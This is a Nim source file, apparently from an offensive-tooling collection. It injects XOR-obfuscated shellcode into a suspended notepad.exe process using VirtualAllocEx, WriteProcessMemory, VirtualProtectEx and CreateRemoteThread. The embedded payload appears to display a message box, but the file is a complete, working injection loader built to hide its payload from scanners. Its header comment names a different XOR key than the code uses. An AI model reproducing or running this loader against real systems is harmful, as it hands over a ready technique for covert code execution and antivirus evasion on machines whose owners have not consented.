#[
    Reference: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/shellcode_bin.nim

  - Same injection code as shellcode_hollowing, but the shellcode itself is XOR'd against the letter 'A' beforehand and re-XOR'd at runtime

]#

import winim/lean
import osproc
import nimcrypto

proc injectCreateRemoteThread[I, T](shellcode: array[I, T]): void =

  let tProcess = startProcess("notepad.exe")
  tProcess.suspend()
  defer: tProcess.close()

  echo "[*] Target Process: ", tProcess.processID

  let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](tProcess.processID))
  defer: CloseHandle(pHandle)

  echo "[*] pHandle: ", pHandle

  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_READWRITE)

  var bytesWritten: SIZE_T
  let wSuccess = WriteProcessMemory(pHandle, rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len),addr bytesWritten)

  echo "[*] WriteProcessMemory: ", bool(wSuccess)
  echo "    \\-- bytes written: ", bytesWritten
  echo ""

  var oldProtect: DWORD
  let protSuccess = VirtualProtectEx(pHandle, cast[LPVOID](rPtr), shellcode.len, PAGE_EXECUTE_READ, addr oldProtect)

  echo "[*] VirtualProtect: ", bool(protSuccess)
  echo "    \\-- Changed memory protection back to RX instead of RWX"
  echo ""

  let tHandle = CreateRemoteThread(pHandle, NULL, 0, cast[LPTHREAD_START_ROUTINE](rPtr), NULL, 0, NULL)
  defer: CloseHandle(tHandle)

  echo "[*] tHandle: ", tHandle
  echo "[+] Injected"

when defined(windows):

  var shellcode_xor: string = "65D1187D696666667149999999D8C8D8C9CBC8CFD1A84BFCD112CBF9A7D112CB81A7D112CBB9A7D112EBC9A7D1962ED3D3D4A850D1A85935A5F8E59BB5B9D8585094D898587B74CBD8C8A7D112CBB9A712DBA5D19849A7121911999999D11C59EDF6D19849C9A712D181A7DD12D9B9D098497AC5D16650A7D812AD11D1984FD4A850D1A85935D8585094D89858A179EC68A7D59AD5BD91DCA048EC4FC1A7DD12D9BDD09849FFA7D81295D1A7DD12D985D09849A7D8129D11D19849D8C1D8C1C7C0C3D8C1D8C0D8C3D11A75B9D8CB6679C1D8C0C3A7D1128B70D0666666C4D05E5899999999A7D1140C67999999A7D5141C94989999D1A850D823DC1ACF9E664CD1A850D823692C3BCF664CDFF5F0F2F2B9EEF8EAB9F1FCEBFC99D4FCEAEAF8FEFCDBF6E199"
  var shellcode: array[293, byte]
  
  for i, b in fromHex(shellcode_xor):
    var result = b xor 0x99
    shellcode[i] = result

# This is essentially the equivalent of 'if __name__ == '__main__' in python
  when isMainModule:
    #echo "Shellcode: ", toHex(shellcode)
    injectCreateRemoteThread(shellcode)